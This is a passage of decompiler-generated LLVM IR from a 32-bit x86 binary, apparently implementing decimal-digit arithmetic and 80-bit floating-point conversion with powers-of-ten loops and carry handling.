  %v10_8052c57 = icmp ult i32 %v3_8052c57, %v3_8052c51
  %v1_8052c5b = icmp eq i1 %v10_8052c57, false
  br i1 %v1_8052c5b, label %dec_label_pc_8052c51.dec_label_pc_8052c80_crit_edge, label %dec_label_pc_8052c5d

dec_label_pc_8052c51.dec_label_pc_8052c80_crit_edge: ; preds = %dec_label_pc_8052c51
  %v2_8052c98.pre = load i32, i32* %edx.global-to-local, align 4
  %.pre537 = add i32 %v0_8052ca9, 104
  %.pre538 = inttoptr i32 %.pre537 to i32*
  br label %dec_label_pc_8052c80

dec_label_pc_8052c5d:                             ; preds = %dec_label_pc_8052c51
  store i32 %v3_8052c57, i32* %esi.global-to-local, align 4
  %v1_8052c61 = add i32 %v0_8052ca9, 104
  %v2_8052c61 = inttoptr i32 %v1_8052c61 to i32*
  %v3_8052c61 = load i32, i32* %v2_8052c61, align 4
  store i32 %v3_8052c61, i32* %eax.global-to-local, align 4
  %v4_8052c65 = load i32, i32* %v2_8052c57, align 4
  %v5_8052c65 = sub i32 %v3_8052c61, %v4_8052c65
  store i32 %v5_8052c65, i32* %eax.global-to-local, align 4
  %v1_8052c69 = inttoptr i32 %v3_8052c57 to i32*
  %v2_8052c69 = load i32, i32* %v1_8052c69, align 4
  store i32 %v2_8052c69, i32* %edx.global-to-local, align 4
  %v2_8052c6b = sdiv i32 %v5_8052c65, 4
  %v3_8052c6e = mul i32 %v2_8052c6b, 9
  store i32 %v3_8052c6e, i32* @ebp, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v7_8052c7c395 = icmp ult i32 %v2_8052c69, 10
  %v1_8052c7e396 = icmp eq i1 %v7_8052c7c395, false
  br i1 %v1_8052c7e396, label %dec_label_pc_8052c78, label %dec_label_pc_8052c80.loopexit

dec_label_pc_8052c78:                             ; preds = %dec_label_pc_8052c5d, %dec_label_pc_8052c78
  %v1_8052c78398 = phi i32 [ %v3_8052c78, %dec_label_pc_8052c78 ], [ 10, %dec_label_pc_8052c5d ]
  %v0_8052c7b397 = phi i32 [ %v1_8052c7b, %dec_label_pc_8052c78 ], [ %v3_8052c6e, %dec_label_pc_8052c5d ]
  %v3_8052c78 = mul i32 %v1_8052c78398, 10
  %v1_8052c7b = add i32 %v0_8052c7b397, 1
  %v7_8052c7c = icmp ult i32 %v2_8052c69, %v3_8052c78
  %v1_8052c7e = icmp eq i1 %v7_8052c7c, false
  br i1 %v1_8052c7e, label %dec_label_pc_8052c78, label %dec_label_pc_8052c7c.dec_label_pc_8052c80.loopexit_crit_edge

dec_label_pc_8052c7c.dec_label_pc_8052c80.loopexit_crit_edge: ; preds = %dec_label_pc_8052c78
  store i32 %v3_8052c78, i32* %eax.global-to-local, align 4
  store i32 %v1_8052c7b, i32* @ebp, align 4
  br label %dec_label_pc_8052c80.loopexit

dec_label_pc_8052c80.loopexit:                    ; preds = %dec_label_pc_8052c7c.dec_label_pc_8052c80.loopexit_crit_edge, %dec_label_pc_8052c5d
  %v0_8052c7b.lcssa = phi i32 [ %v1_8052c7b, %dec_label_pc_8052c7c.dec_label_pc_8052c80.loopexit_crit_edge ], [ %v3_8052c6e, %dec_label_pc_8052c5d ]
  br label %dec_label_pc_8052c80

dec_label_pc_8052c80:                             ; preds = %dec_label_pc_8052c51.dec_label_pc_8052c80_crit_edge, %dec_label_pc_8052c80.loopexit
  %v3_8052cad.pre-phi = phi i32* [ %.pre538, %dec_label_pc_8052c51.dec_label_pc_8052c80_crit_edge ], [ %v2_8052c61, %dec_label_pc_8052c80.loopexit ]
  %v2_8052c98 = phi i32 [ %v2_8052c98.pre, %dec_label_pc_8052c51.dec_label_pc_8052c80_crit_edge ], [ %v2_8052c69, %dec_label_pc_8052c80.loopexit ]
  %v1_8052c8e = phi i32 [ 0, %dec_label_pc_8052c51.dec_label_pc_8052c80_crit_edge ], [ %v0_8052c7b.lcssa, %dec_label_pc_8052c80.loopexit ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052c82 = add i32 %v0_8052ca9, 52
  %v2_8052c82 = inttoptr i32 %v1_8052c82 to i32*
  %v3_8052c82 = load i32, i32* %v2_8052c82, align 4
  store i32 %v3_8052c82, i32* %ecx.global-to-local, align 4
  %v1_8052c86 = add i32 %v0_8052ca9, 92
  %v2_8052c86 = inttoptr i32 %v1_8052c86 to i32*
  %v3_8052c86 = load i32, i32* %v2_8052c86, align 4
  %v12_8052c86 = icmp eq i32 %v3_8052c86, 102
  %v1_8052c8b = icmp eq i1 %v12_8052c86, false
  %v5_8052c8e = select i1 %v1_8052c8b, i32 %v1_8052c8e, i32 0
  store i32 %v5_8052c8e, i32* %eax.global-to-local, align 4
  %v2_8052c91 = sub i32 %v3_8052c82, %v5_8052c8e
  store i32 %v2_8052c91, i32* %ecx.global-to-local, align 4
  %v3_8052c93 = load i32, i32* %v2_8052c86, align 4
  %v12_8052c93 = icmp eq i32 %v3_8052c93, 103
  %v1_8052c98 = zext i1 %v12_8052c93 to i32
  %v3_8052c98 = and i32 %v2_8052c98, -256
  %v4_8052c98 = or i32 %v1_8052c98, %v3_8052c98
  store i32 %v4_8052c98, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8052c9d = load i32, i32* %v2_8052c82, align 4
  %v4_8052c9d = icmp eq i32 %v3_8052c9d, 0
  %v1_8052ca2 = icmp eq i1 %v4_8052c9d, false
  %v2_8052ca2 = zext i1 %v1_8052ca2 to i32
  %v2_8052ca5 = and i32 %v2_8052ca2, %v1_8052c98
  store i32 %v2_8052ca5, i32* %eax.global-to-local, align 4
  %v2_8052ca7 = sub i32 %v2_8052c91, %v2_8052ca5
  store i32 %v2_8052ca7, i32* %ecx.global-to-local, align 4
  %v3_8052ca9 = load i32, i32* %v2_8052c51, align 4
  store i32 %v3_8052ca9, i32* %eax.global-to-local, align 4
  %v4_8052cad = load i32, i32* %v3_8052cad.pre-phi, align 4
  %v5_8052cad = sub i32 %v3_8052ca9, %v4_8052cad
  %v2_8052cb1 = sdiv i32 %v5_8052cad, 4
  %v3_8052cb4 = mul i32 %v2_8052cb1, 9
  %v1_8052cb7 = add i32 %v3_8052cb4, -9
  store i32 %v1_8052cb7, i32* %eax.global-to-local, align 4
  %v2_8052cba = sub i32 %v2_8052ca7, %v1_8052cb7
  %v8_8052cba = xor i32 %v1_8052cb7, %v2_8052ca7
  %v9_8052cba = xor i32 %v2_8052cba, %v2_8052ca7
  %v10_8052cba = and i32 %v9_8052cba, %v8_8052cba
  %v11_8052cba = icmp slt i32 %v10_8052cba, 0
  %v13_8052cba = icmp slt i32 %v2_8052cba, 0
  %v2_8052cbc = icmp eq i1 %v13_8052cba, %v11_8052cba
  br i1 %v2_8052cbc, label %dec_label_pc_8052e86.preheader, label %dec_label_pc_8052cc2

dec_label_pc_8052cc2:                             ; preds = %dec_label_pc_8052c80
  %v1_8052cc2 = add i32 %v2_8052ca7, 147456
  store i32 %v1_8052cc2, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v3_8052ccd = load i32, i32* %v3_8052cad.pre-phi, align 4
  %v1_8052cd3 = ashr i32 %v1_8052cc2, 31
  %v2_8052cd4 = zext i32 %v1_8052cc2 to i64
  %v4_8052cd4 = zext i32 %v1_8052cd3 to i64
  %v5_8052cd4 = mul nuw i64 %v4_8052cd4, 4294967296
  %v6_8052cd4 = or i64 %v5_8052cd4, %v2_8052cd4
  %v8_8052cd4 = sdiv i64 %v6_8052cd4, 9
  %v9_8052cd4 = trunc i64 %v8_8052cd4 to i32
  store i32 %v9_8052cd4, i32* %eax.global-to-local, align 4
  %v10_8052cd4 = srem i64 %v6_8052cd4, 9
  %v11_8052cd4 = trunc i64 %v10_8052cd4 to i32
  store i32 %v11_8052cd4, i32* %edx.global-to-local, align 4
  %v2_8052cd6 = mul i32 %v9_8052cd4, 4
  %v3_8052cd6 = add i32 %v2_8052cd6, -65532
  %v4_8052cd6 = add i32 %v3_8052cd6, %v3_8052ccd
  store i32 %v4_8052cd6, i32* %ecx.global-to-local, align 4
  store i32 10, i32* @ebx, align 4
  %storemerge23403 = add i32 %v11_8052cd4, 1
  %v1_8052ceb404 = add i32 %v11_8052cd4, -7
  %v6_8052ceb405 = sub i32 6, %v11_8052cd4
  %v7_8052ceb406 = and i32 %v6_8052ceb405, %storemerge23403
  %v8_8052ceb407 = icmp slt i32 %v7_8052ceb406, 0
  %v9_8052ceb408 = icmp eq i32 %v1_8052ceb404, 0
  %v10_8052ceb409 = icmp slt i32 %v1_8052ceb404, 0
  %v3_8052cee410 = icmp ne i1 %v10_8052ceb409, %v8_8052ceb407
  %v4_8052cee411 = or i1 %v9_8052ceb408, %v3_8052cee410
  br i1 %v4_8052cee411, label %dec_label_pc_8052ce7, label %dec_label_pc_8052cf0

dec_label_pc_8052ce7:                             ; preds = %dec_label_pc_8052cc2, %dec_label_pc_8052ce7
  %storemerge23413 = phi i32 [ %storemerge23, %dec_label_pc_8052ce7 ], [ %storemerge23403, %dec_label_pc_8052cc2 ]
  %storemerge215412 = phi i32 [ %v3_8052ce7, %dec_label_pc_8052ce7 ], [ 10, %dec_label_pc_8052cc2 ]
  %v3_8052ce7 = mul i32 %storemerge215412, 10
  %storemerge23 = add i32 %storemerge23413, 1
  %v1_8052ceb = add i32 %storemerge23413, -7
  %v6_8052ceb = sub i32 6, %storemerge23413
  %v7_8052ceb = and i32 %v6_8052ceb, %storemerge23
  %v8_8052ceb = icmp slt i32 %v7_8052ceb, 0
  %v9_8052ceb = icmp eq i32 %v1_8052ceb, 0
  %v10_8052ceb = icmp slt i32 %v1_8052ceb, 0
  %v3_8052cee = icmp ne i1 %v10_8052ceb, %v8_8052ceb
  %v4_8052cee = or i1 %v9_8052ceb, %v3_8052cee
  br i1 %v4_8052cee, label %dec_label_pc_8052ce7, label %dec_label_pc_8052ceb.dec_label_pc_8052cf0_crit_edge

dec_label_pc_8052ceb.dec_label_pc_8052cf0_crit_edge: ; preds = %dec_label_pc_8052ce7
  store i32 %v3_8052ce7, i32* @ebx, align 4
  br label %dec_label_pc_8052cf0

dec_label_pc_8052cf0:                             ; preds = %dec_label_pc_8052ceb.dec_label_pc_8052cf0_crit_edge, %dec_label_pc_8052cc2
  %storemerge215.lcssa = phi i32 [ %v3_8052ce7, %dec_label_pc_8052ceb.dec_label_pc_8052cf0_crit_edge ], [ 10, %dec_label_pc_8052cc2 ]
  %storemerge23.lcssa = phi i32 [ %storemerge23, %dec_label_pc_8052ceb.dec_label_pc_8052cf0_crit_edge ], [ %storemerge23403, %dec_label_pc_8052cc2 ]
  store i32 %storemerge23.lcssa, i32* %eax.global-to-local, align 4
  %v1_8052cf0 = inttoptr i32 %v4_8052cd6 to i32*
  %v2_8052cf0 = load i32, i32* %v1_8052cf0, align 4
  store i32 %v2_8052cf0, i32* %edi.global-to-local, align 4
  %div = udiv i32 %v2_8052cf0, %storemerge215.lcssa
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp249 = urem i32 %v2_8052cf0, %storemerge215.lcssa
  store i32 %tmp249, i32* %edx.global-to-local, align 4
  %v1_8052cf8 = icmp eq i32 %tmp249, 0
  %v2_8052cfa = add i32 %v0_8052ca9, 12
  %v3_8052cfa = inttoptr i32 %v2_8052cfa to i32*
  store i32 %tmp249, i32* %v3_8052cfa, align 4
  %v0_8052cfe = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cfe = load i32, i32* @esp, align 4
  %v2_8052cfe = add i32 %v1_8052cfe, 20
  %v3_8052cfe = inttoptr i32 %v2_8052cfe to i32*
  store i32 %v0_8052cfe, i32* %v3_8052cfe, align 4
  %v1_8052d02 = icmp eq i1 %v1_8052cf8, false
  br i1 %v1_8052d02, label %dec_label_pc_8052cf0.dec_label_pc_8052d11_crit_edge, label %dec_label_pc_8052d04

dec_label_pc_8052cf0.dec_label_pc_8052d11_crit_edge: ; preds = %dec_label_pc_8052cf0
  %v0_8052d11.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052d11

dec_label_pc_8052d04:                             ; preds = %dec_label_pc_8052cf0
  %v0_8052d04 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052d04 = add i32 %v0_8052d04, 4
  store i32 %v1_8052d04, i32* %eax.global-to-local, align 4
  %v1_8052d07 = load i32, i32* @esp, align 4
  %v2_8052d07 = add i32 %v1_8052d07, 100
  %v3_8052d07 = inttoptr i32 %v2_8052d07 to i32*
  %v4_8052d07 = load i32, i32* %v3_8052d07, align 4
  %v15_8052d07 = icmp eq i32 %v1_8052d04, %v4_8052d07
  br i1 %v15_8052d07, label %dec_label_pc_8052e72, label %dec_label_pc_8052d11

dec_label_pc_8052d11:                             ; preds = %dec_label_pc_8052cf0.dec_label_pc_8052d11_crit_edge, %dec_label_pc_8052d04
  %v0_8052d25 = phi i32 [ %v0_8052d11.pre, %dec_label_pc_8052cf0.dec_label_pc_8052d11_crit_edge ], [ %v1_8052d07, %dec_label_pc_8052d04 ]
  %v1_8052d11 = add i32 %v0_8052d25, 20
  %v2_8052d11 = inttoptr i32 %v1_8052d11 to i8*
  %v3_8052d11 = load i8, i8* %v2_8052d11, align 1
  %v4_8052d11 = urem i8 %v3_8052d11, 2
  %v5_8052d11 = icmp ne i8 %v4_8052d11, 0
  %v1_8052d25 = add i32 %v0_8052d25, 7744
  %v2_8052d25 = inttoptr i32 %v1_8052d25 to i32*
  %.67 = zext i1 %v5_8052d11 to i32
  store i32 %.67, i32* %v2_8052d25, align 4
  %v0_8052d30 = load i32, i32* @ebx, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  %v1_8052d37 = ashr i32 %v0_8052d30, 31
  %v2_8052d38 = zext i32 %v0_8052d30 to i64
  %v4_8052d38 = zext i32 %v1_8052d37 to i64
  %v5_8052d38 = mul nuw i64 %v4_8052d38, 4294967296
  %v6_8052d38 = or i64 %v5_8052d38, %v2_8052d38
  %v8_8052d38 = sdiv i64 %v6_8052d38, 2
  %v9_8052d38 = trunc i64 %v8_8052d38 to i32
  store i32 %v9_8052d38, i32* %eax.global-to-local, align 4
  %v10_8052d38 = srem i64 %v6_8052d38, 2
  %v11_8052d38 = trunc i64 %v10_8052d38 to i32
  store i32 %v11_8052d38, i32* %edx.global-to-local, align 4
  %v0_8052d3a = load i32, i32* @esp, align 4
  %v1_8052d3a = add i32 %v0_8052d3a, 7748
  %v2_8052d3a = inttoptr i32 %v1_8052d3a to i32*
  store i32 -2147483648, i32* %v2_8052d3a, align 4
  %v0_8052d45 = load i32, i32* @esp, align 4
  %v1_8052d45 = add i32 %v0_8052d45, 7752
  %v2_8052d45 = inttoptr i32 %v1_8052d45 to i32*
  store i32 16447, i32* %v2_8052d45, align 4
  %v0_8052d50 = load i32, i32* @esp, align 4
  %v1_8052d50 = add i32 %v0_8052d50, 12
  %v2_8052d50 = inttoptr i32 %v1_8052d50 to i32*
  %v3_8052d50 = load i32, i32* %v2_8052d50, align 4
  %v4_8052d50 = load i32, i32* %eax.global-to-local, align 4
  %v10_8052d50 = icmp ult i32 %v3_8052d50, %v4_8052d50
  %v2_8052d54 = add i32 %v0_8052d50, 16
  %v3_8052d54 = inttoptr i32 %v2_8052d54 to i32*
  store i32 %v4_8052d50, i32* %v3_8052d54, align 4
  %v1_8052d58 = icmp eq i1 %v10_8052d50, false
  br i1 %v1_8052d58, label %dec_label_pc_8052d7d, label %dec_label_pc_8052d5a

dec_label_pc_8052d5a:                             ; preds = %dec_label_pc_8052d11
  %v0_8052d5a = load i32, i32* @esp, align 4
  %v1_8052d5a = add i32 %v0_8052d5a, 7728
  %v2_8052d5a = inttoptr i32 %v1_8052d5a to i32*
  store i32 0, i32* %v2_8052d5a, align 4
  %v0_8052d65 = load i32, i32* @esp, align 4
  %v1_8052d65 = add i32 %v0_8052d65, 7732
  %v2_8052d65 = inttoptr i32 %v1_8052d65 to i32*
  store i32 -2147483648, i32* %v2_8052d65, align 4
  %v0_8052d70 = load i32, i32* @esp, align 4
  %v1_8052d70 = add i32 %v0_8052d70, 7736
  %v2_8052d70 = inttoptr i32 %v1_8052d70 to i32*
  store i32 16382, i32* %v2_8052d70, align 4
  br label %dec_label_pc_8052dc1

dec_label_pc_8052d7d:                             ; preds = %dec_label_pc_8052d11
  %v15_8052d50 = icmp eq i32 %v3_8052d50, %v4_8052d50
  %v1_8052d7d = icmp eq i1 %v15_8052d50, false
  br i1 %v1_8052d7d, label %dec_label_pc_8052d7d.dec_label_pc_8052da0_crit_edge, label %dec_label_pc_8052d7f

dec_label_pc_8052d7d.dec_label_pc_8052da0_crit_edge: ; preds = %dec_label_pc_8052d7d
  %v0_8052da0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052da0

dec_label_pc_8052d7f:                             ; preds = %dec_label_pc_8052d7d
  %v0_8052d7f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052d7f = add i32 %v0_8052d7f, 4
  store i32 %v1_8052d7f, i32* %eax.global-to-local, align 4
  %v1_8052d82 = load i32, i32* @esp, align 4
  %v2_8052d82 = add i32 %v1_8052d82, 100
  %v3_8052d82 = inttoptr i32 %v2_8052d82 to i32*
  %v4_8052d82 = load i32, i32* %v3_8052d82, align 4
  %v15_8052d82 = icmp eq i32 %v1_8052d7f, %v4_8052d82
  %v1_8052d86 = icmp eq i1 %v15_8052d82, false
  br i1 %v1_8052d86, label %dec_label_pc_8052da0, label %dec_label_pc_8052d88

dec_label_pc_8052d88:                             ; preds = %dec_label_pc_8052d7f
  %v1_8052d88 = add i32 %v1_8052d82, 7728
  %v2_8052d88 = inttoptr i32 %v1_8052d88 to i32*
  store i32 0, i32* %v2_8052d88, align 4
  %v0_8052d93 = load i32, i32* @esp, align 4
  %v1_8052d93 = add i32 %v0_8052d93, 7732
  %v2_8052d93 = inttoptr i32 %v1_8052d93 to i32*
  store i32 -2147483648, i32* %v2_8052d93, align 4
  br label %dec_label_pc_8052db6

dec_label_pc_8052da0:                             ; preds = %dec_label_pc_8052d7d.dec_label_pc_8052da0_crit_edge, %dec_label_pc_8052d7f
  %v0_8052da0 = phi i32 [ %v0_8052da0.pre, %dec_label_pc_8052d7d.dec_label_pc_8052da0_crit_edge ], [ %v1_8052d82, %dec_label_pc_8052d7f ]
  %v1_8052da0 = add i32 %v0_8052da0, 7728
  %v2_8052da0 = inttoptr i32 %v1_8052da0 to i32*
  store i32 0, i32* %v2_8052da0, align 4
  %v0_8052dab = load i32, i32* @esp, align 4
  %v1_8052dab = add i32 %v0_8052dab, 7732
  %v2_8052dab = inttoptr i32 %v1_8052dab to i32*
  store i32 -1073741824, i32* %v2_8052dab, align 4
  br label %dec_label_pc_8052db6

dec_label_pc_8052db6:                             ; preds = %dec_label_pc_8052d88, %dec_label_pc_8052da0
  %v0_8052db6 = load i32, i32* @esp, align 4
  %v1_8052db6 = add i32 %v0_8052db6, 7736
  %v2_8052db6 = inttoptr i32 %v1_8052db6 to i32*
  store i32 16383, i32* %v2_8052db6, align 4
  br label %dec_label_pc_8052dc1

dec_label_pc_8052dc1:                             ; preds = %dec_label_pc_8052d5a, %dec_label_pc_8052db6
  %v0_8052dc1 = load i32, i32* @esp, align 4
  %v1_8052dc1 = add i32 %v0_8052dc1, 80
  %v2_8052dc1 = inttoptr i32 %v1_8052dc1 to i32*
  %v3_8052dc1 = load i32, i32* %v2_8052dc1, align 4
  %v4_8052dc1 = icmp eq i32 %v3_8052dc1, 0
  br i1 %v4_8052dc1, label %dec_label_pc_8052df1, label %dec_label_pc_8052dc8

dec_label_pc_8052dc8:                             ; preds = %dec_label_pc_8052dc1
  %v1_8052dc8 = add i32 %v0_8052dc1, 84
  %v2_8052dc8 = inttoptr i32 %v1_8052dc8 to i32*
  %v3_8052dc8 = load i32, i32* %v2_8052dc8, align 4
  store i32 %v3_8052dc8, i32* %eax.global-to-local, align 4
  %v1_8052dcc = inttoptr i32 %v3_8052dc8 to i8*
  %v2_8052dcc = load i8, i8* %v1_8052dcc, align 1
  %v11_8052dcc = icmp eq i8 %v2_8052dcc, 45
  %v1_8052dcf = icmp eq i1 %v11_8052dcc, false
  br i1 %v1_8052dcf, label %dec_label_pc_8052df1, label %dec_label_pc_8052dd1

dec_label_pc_8052dd1:                             ; preds = %dec_label_pc_8052dc8
  %v1_8052dd1 = add i32 %v0_8052dc1, 7744
  %v2_8052dd1 = inttoptr i32 %v1_8052dd1 to x86_fp80*
  %v3_8052dd1 = load x86_fp80, x86_fp80* %v2_8052dd1, align 4
  %v2_8052dd8 = fsub x86_fp80 0xK80000000000000000000, %v3_8052dd1
  store x86_fp80 %v2_8052dd8, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 %v2_8052dd8, x86_fp80* %v2_8052dd1, align 4
  %v1_8052de1 = add i32 %v0_8052dc1, 7728
  %v2_8052de1 = inttoptr i32 %v1_8052de1 to x86_fp80*
  %v3_8052de1 = load x86_fp80, x86_fp80* %v2_8052de1, align 4
  %v2_8052de8 = fsub x86_fp80 0xK80000000000000000000, %v3_8052de1
  store x86_fp80 %v2_8052de8, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 %v2_8052de8, x86_fp80* %v2_8052de1, align 4
  br label %dec_label_pc_8052df1

dec_label_pc_8052df1:                             ; preds = %dec_label_pc_8052dc8, %dec_label_pc_8052dc1, %dec_label_pc_8052dd1
  %v1_8052df1 = add i32 %v0_8052dc1, 7744
  %v2_8052df1 = inttoptr i32 %v1_8052df1 to x86_fp80*
  %v3_8052df1 = load x86_fp80, x86_fp80* %v2_8052df1, align 4
  store x86_fp80 %v3_8052df1, x86_fp80* %st0.global-to-local, align 4
  %v0_8052df8 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8052df8, i32* %edx.global-to-local, align 4
  %v2_8052dfa = add i32 %v0_8052dc1, 12
  %v3_8052dfa = inttoptr i32 %v2_8052dfa to i32*
  %v4_8052dfa = load i32, i32* %v3_8052dfa, align 4
  %v5_8052dfa = sub i32 %v0_8052df8, %v4_8052dfa
  store i32 %v5_8052dfa, i32* %edx.global-to-local, align 4
  %v1_8052dfe = add i32 %v0_8052dc1, 7728
  %v2_8052dfe = inttoptr i32 %v1_8052dfe to x86_fp80*
  %v3_8052dfe = load x86_fp80, x86_fp80* %v2_8052dfe, align 4
  store x86_fp80 %v3_8052dfe, x86_fp80* %st1.global-to-local, align 4
  %v1_8052e05 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e05 = inttoptr i32 %v1_8052e05 to i32*
  store i32 %v5_8052dfa, i32* %v2_8052e05, align 4
  %v2_8052e07 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8052e07 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v4_8052e07 = fadd x86_fp80 %v2_8052e07, %v3_8052e07
  store x86_fp80 %v4_8052e07, x86_fp80* %st0.global-to-local, align 4
  %v2_8052e09 = load i32, i32* @esp, align 4
  %v3_8052e09 = add i32 %v2_8052e09, 7632
  %v4_8052e09 = inttoptr i32 %v3_8052e09 to x86_fp80*
  store x86_fp80 %v3_8052e07, x86_fp80* %v4_8052e09, align 4
  store x86_fp80 %v3_8052e07, x86_fp80* %st1.global-to-local, align 4
  %v0_8052e1b = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e1b = udiv i32 %v0_8052e1b, 256
  %tmp555 = and i32 %v1_8052e1b, 68
  %tmp556 = icmp eq i32 %tmp555, 64
  br i1 %tmp556, label %dec_label_pc_8052e1e.dec_label_pc_8052e72_crit_edge, label %dec_label_pc_8052e20

dec_label_pc_8052e1e.dec_label_pc_8052e72_crit_edge: ; preds = %dec_label_pc_8052df1
  %v0_8052e72.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052e72

dec_label_pc_8052e20:                             ; preds = %dec_label_pc_8052df1
  %v0_8052e20 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e20 = load i32, i32* @ebx, align 4
  %v2_8052e20 = add i32 %v1_8052e20, %v0_8052e20
  store i32 %v2_8052e20, i32* %eax.global-to-local, align 4
  %v1_8052e23 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e23 = inttoptr i32 %v1_8052e23 to i32*
  store i32 %v2_8052e20, i32* %v2_8052e23, align 4
  %v0_8052e47416 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e47417 = inttoptr i32 %v0_8052e47416 to i32*
  %v2_8052e47418 = load i32, i32* %v1_8052e47417, align 4
  %tmp250419 = icmp ult i32 %v2_8052e47418, 1000000000
  br i1 %tmp250419, label %dec_label_pc_8052e4f, label %dec_label_pc_8052e27

dec_label_pc_8052e27:                             ; preds = %dec_label_pc_8052e20, %dec_label_pc_8052e45
  %v1_8052e47420 = phi i32* [ %v1_8052e47, %dec_label_pc_8052e45 ], [ %v1_8052e47417, %dec_label_pc_8052e20 ]
  store i32 0, i32* %v1_8052e47420, align 4
  %v0_8052e2d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e2d = add i32 %v0_8052e2d, -4
  store i32 %v1_8052e2d, i32* %ecx.global-to-local, align 4
  %v1_8052e30 = load i32, i32* @esp, align 4
  %v2_8052e30 = add i32 %v1_8052e30, 96
  %v3_8052e30 = inttoptr i32 %v2_8052e30 to i32*
  %v4_8052e30 = load i32, i32* %v3_8052e30, align 4
  %v10_8052e30 = icmp ult i32 %v1_8052e2d, %v4_8052e30
  %v1_8052e34 = icmp eq i1 %v10_8052e30, false
  br i1 %v1_8052e34, label %dec_label_pc_8052e45, label %dec_label_pc_8052e36

dec_label_pc_8052e36:                             ; preds = %dec_label_pc_8052e27
  %v4_8052e36 = add i32 %v4_8052e30, -4
  store i32 %v4_8052e36, i32* %v3_8052e30, align 4
  %v0_8052e3b = load i32, i32* @esp, align 4
  %v1_8052e3b = add i32 %v0_8052e3b, 96
  %v2_8052e3b = inttoptr i32 %v1_8052e3b to i32*
  %v3_8052e3b = load i32, i32* %v2_8052e3b, align 4
  store i32 %v3_8052e3b, i32* %edx.global-to-local, align 4
  %v1_8052e3f = inttoptr i32 %v3_8052e3b to i32*
  store i32 0, i32* %v1_8052e3f, align 4
  %v0_8052e45.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052e45

dec_label_pc_8052e45:                             ; preds = %dec_label_pc_8052e27, %dec_label_pc_8052e36
  %v0_8052e45 = phi i32 [ %v1_8052e2d, %dec_label_pc_8052e27 ], [ %v0_8052e45.pre, %dec_label_pc_8052e36 ]
  %v1_8052e45 = inttoptr i32 %v0_8052e45 to i32*
  %v2_8052e45 = load i32, i32* %v1_8052e45, align 4
  %v3_8052e45 = add i32 %v2_8052e45, 1
  store i32 %v3_8052e45, i32* %v1_8052e45, align 4
  %v0_8052e47 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e47 = inttoptr i32 %v0_8052e47 to i32*
  %v2_8052e47 = load i32, i32* %v1_8052e47, align 4
  %tmp250 = icmp ult i32 %v2_8052e47, 1000000000
  br i1 %tmp250, label %dec_label_pc_8052e4f, label %dec_label_pc_8052e27

dec_label_pc_8052e4f:                             ; preds = %dec_label_pc_8052e45, %dec_label_pc_8052e20
  %v0_8052e47.lcssa = phi i32 [ %v0_8052e47416, %dec_label_pc_8052e20 ], [ %v0_8052e47, %dec_label_pc_8052e45 ]
  %v0_8052e4f = load i32, i32* @esp, align 4
  %v1_8052e4f = add i32 %v0_8052e4f, 96
  %v2_8052e4f = inttoptr i32 %v1_8052e4f to i32*
  %v3_8052e4f = load i32, i32* %v2_8052e4f, align 4
  store i32 %v3_8052e4f, i32* @ebx, align 4
  %v1_8052e53 = add i32 %v0_8052e4f, 104
  %v2_8052e53 = inttoptr i32 %v1_8052e53 to i32*
  %v3_8052e53 = load i32, i32* %v2_8052e53, align 4
  store i32 %v3_8052e53, i32* %eax.global-to-local, align 4
  %v4_8052e57 = load i32, i32* %v2_8052e4f, align 4
  %v5_8052e57 = sub i32 %v3_8052e53, %v4_8052e57
  store i32 %v5_8052e57, i32* %eax.global-to-local, align 4
  %v1_8052e5b = inttoptr i32 %v3_8052e4f to i32*
  %v2_8052e5b = load i32, i32* %v1_8052e5b, align 4
  store i32 %v2_8052e5b, i32* %edx.global-to-local, align 4
  %v2_8052e5d = sdiv i32 %v5_8052e57, 4
  %v3_8052e60 = mul i32 %v2_8052e5d, 9
  store i32 %v3_8052e60, i32* @ebp, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v7_8052e6e423 = icmp ult i32 %v2_8052e5b, 10
  %v1_8052e70424 = icmp eq i1 %v7_8052e6e423, false
  br i1 %v1_8052e70424, label %dec_label_pc_8052e6a, label %dec_label_pc_8052e72.loopexit

dec_label_pc_8052e6a:                             ; preds = %dec_label_pc_8052e4f, %dec_label_pc_8052e6a
  %v1_8052e6a426 = phi i32 [ %v3_8052e6a, %dec_label_pc_8052e6a ], [ 10, %dec_label_pc_8052e4f ]
  %v0_8052e6d425 = phi i32 [ %v1_8052e6d, %dec_label_pc_8052e6a ], [ %v3_8052e60, %dec_label_pc_8052e4f ]
  %v3_8052e6a = mul i32 %v1_8052e6a426, 10
  %v1_8052e6d = add i32 %v0_8052e6d425, 1
  %v7_8052e6e = icmp ult i32 %v2_8052e5b, %v3_8052e6a
  %v1_8052e70 = icmp eq i1 %v7_8052e6e, false
  br i1 %v1_8052e70, label %dec_label_pc_8052e6a, label %dec_label_pc_8052e6e.dec_label_pc_8052e72.loopexit_crit_edge

dec_label_pc_8052e6e.dec_label_pc_8052e72.loopexit_crit_edge: ; preds = %dec_label_pc_8052e6a
  store i32 %v3_8052e6a, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e6d, i32* @ebp, align 4
  br label %dec_label_pc_8052e72.loopexit

